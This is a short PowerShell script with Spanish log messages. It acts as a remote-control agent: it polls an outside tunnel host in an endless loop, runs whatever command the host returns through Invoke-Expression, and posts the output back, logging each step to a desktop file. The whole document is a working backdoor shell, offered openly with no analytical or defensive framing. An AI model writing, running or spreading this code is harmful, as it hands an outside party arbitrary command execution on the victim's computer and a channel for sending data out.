# LOG DE DEPURACIÓN
"Agente iniciado: $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\agente_log.txt" -Append

$u = 'https://480c88b879ff27c7-84-126-116-174.serveousercontent.com'

while ($true) {
    try {
        "Intentando conectar a $u..." | Out-File -FilePath "$env:USERPROFILE\Desktop\agente_log.txt" -Append
        $c = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 5).Content
        "Recibido: $c" | Out-File -FilePath "$env:USERPROFILE\Desktop\agente_log.txt" -Append
        
        if ($c -and $c -ne 'OK') {
            $r = iex $c 2>&1 | Out-String
            Invoke-WebRequest -Uri $u -Method POST -Body $r -UseBasicParsing -TimeoutSec 10
            "Comando ejecutado, resultado enviado" | Out-File -FilePath "$env:USERPROFILE\Desktop\agente_log.txt" -Append
        }
    } catch {
        "ERROR: $_" | Out-File -FilePath "$env:USERPROFILE\Desktop\agente_log.txt" -Append
        Start-Sleep -Seconds 10
    }
    Start-Sleep -Seconds 3
}
